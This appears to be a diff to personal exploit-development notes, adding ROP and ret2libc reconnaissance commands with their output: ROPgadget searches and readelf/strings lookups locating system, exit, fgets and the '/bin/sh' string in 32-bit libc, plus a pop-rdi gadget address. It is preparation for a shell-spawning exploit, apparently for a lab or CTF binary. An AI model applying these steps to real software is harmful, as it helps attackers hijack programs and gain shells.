@@ -68,3 +68,35 @@ __libc_stack_end = 0x0049fa38
 puts = 0x0040a780
 
 0x0000000000402081 : pop rdi ; ret
+
+ROP commands:
+
+ROPgadget --binary /lib32/libc.so.6 | grep -Pi 'pop edi'
+
+readelf -s /lib32/libc.so.6 | grep exit
+   458: 0017edd0    34 FUNC    GLOBAL DEFAULT   14 atexit@GLIBC_2.0
+   582: 0003ead0    33 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.0
+   739: 00040210   198 FUNC    WEAK   DEFAULT   14 on_exit@@GLIBC_2.0
+   795: 0009a160    12 FUNC    GLOBAL DEFAULT   14 thrd_exit@GLIBC_2.28
+   797: 0009a160    12 FUNC    GLOBAL DEFAULT   14 thrd_exit@@GLIBC_2.34
+  1835: 000e6890    56 FUNC    GLOBAL DEFAULT   14 _exit@@GLIBC_2.0
+  2490: 001729a0    56 FUNC    GLOBAL DEFAULT   14 svc_exit@GLIBC_2.0
+  2957: 0017ee00    33 FUNC    GLOBAL DEFAULT   14 quick_exit@GLIBC_2.10
+
+
+readelf -s /lib32/libc.so.6 | grep 'system'
+  1151: 00052220    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
+
+strings -a -t x /lib32/libc.so.6 | grep -Pi 'bin/sh'
+ 1c6e52 /bin/sh
+
+
+readelf -s /lib32/libc.so.6 | grep -Pi 'fgets' 
+    78: 0007a1e0   440 FUNC    WEAK   DEFAULT   14 fgets@@GLIBC_2.0
+   110: 0007a1e0   440 FUNC    GLOBAL DEFAULT   14 _IO_fgets@@GLIBC_2.0
+  1260: 00151450   479 FUNC    GLOBAL DEFAULT   14 fgetsgent@@GLIBC_2.10
+  2231: 0015e110    61 FUNC    WEAK   DEFAULT   14 fgets[...]@@GLIBC_2.0
+  2616: 00085e00   159 FUNC    WEAK   DEFAULT   14 fgets[...]@@GLIBC_2.1
+  3131: 0015df30   479 FUNC    GLOBAL DEFAULT   14 fgetspent@@GLIBC_2.0
+
+
